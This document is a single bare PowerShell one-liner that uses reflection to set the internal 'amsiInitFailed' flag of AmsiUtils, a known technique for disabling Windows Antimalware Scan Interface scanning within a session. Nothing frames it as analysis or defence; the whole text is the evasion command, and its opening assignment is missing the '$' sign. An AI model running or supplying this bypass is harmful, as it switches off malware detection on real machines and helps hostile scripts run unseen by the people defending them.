s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$s.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
